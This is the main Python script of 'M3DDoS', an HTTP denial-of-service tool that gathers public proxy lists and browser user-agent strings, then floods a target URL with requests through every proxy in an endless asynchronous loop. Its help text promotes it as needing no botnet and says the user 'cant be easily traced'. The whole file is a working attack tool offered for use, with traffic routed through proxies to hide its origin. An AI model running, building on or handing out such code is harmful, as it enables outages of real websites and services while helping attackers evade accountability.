#!/usr/bin/env python3

import random
import argparse
import asyncio
import sys
import random
import time

import m3ddos.proxies as m3proxies
import m3ddos.requests as m3requests

from colorama import Fore, Back, Style

def flatten_list(nested_list):
	flat_list = []
	for item in nested_list:
		if isinstance(item, list):
			flat_list.extend(flatten_list(item))  # Recursively flatten nested lists
		else:
			flat_list.append(item)
	return flat_list


m3ddos_help = f"""{sys.argv[0]}: -u [URL]

M3DDoS is an very powerful HTTP DDoS tool, it doesn't require a botnet.
It fetches proxy IP addresses from different urls and sends data
through multiple proxies to the target. You cant be easily traced!
"""

safari = open("user_agents/safari_user_agents.txt", "r")
safari_user_agents = safari.read().split("\n")
safari.close()

opera = open("user_agents/opera_user_agents.txt", "r")
opera_user_agents = opera.read().split("\n")
opera.close()

chrome = open("user_agents/chrome_user_agents.txt", "r")
chrome_user_agents = chrome.read().split("\n")
chrome.close()

firefox = open("user_agents/firefox_user_agents.txt", "r")
firefox_user_agents = firefox.read().split("\n")
firefox.close()

user_agents = []
user_agents.extend(safari_user_agents)
user_agents.extend(opera_user_agents)
user_agents.extend(chrome_user_agents)
user_agents.extend(firefox_user_agents)
random.shuffle(user_agents)

def get_arguments():
	parser = argparse.ArgumentParser(add_help=False)
	parser.add_argument("-u", "--url", dest="target_url", type=str)
	return parser.parse_args()

args = get_arguments()
if args.target_url == None:
	exit(m3ddos_help)

print(r"""
 ____    ____  ______   ______   ______             ______   
|_   \  /   _|/ ____ `.|_   _ `.|_   _ `.         .' ____ \  
  |   \/   |  `'  __) |  | | `. \ | | `. \  .--.  | (___ \_| 
  | |\  /| |  _  |__ '.  | |  | | | |  | |/ .'`\ \ _.____`.  
 _| |_\/_| |_| \____) | _| |_.' /_| |_.' /| \__. || \____) | 
|_____||_____|\______.'|______.'|______.'  '.__.'  \______.'

          @m3xploit - https://github.com/m3xploit
""")

proxy_list = flatten_list(asyncio.run(m3proxies.Proxies().fetch_all_proxies()))
requests = m3requests.Requests(args.target_url, user_agents)

async def main():
	while True:
		request_tasks = [requests.send_request(proxy_ip) for proxy_ip in proxy_list]
		await asyncio.gather(*request_tasks)

input("Press [ENTER] to start DDoS")

asyncio.run(main())	
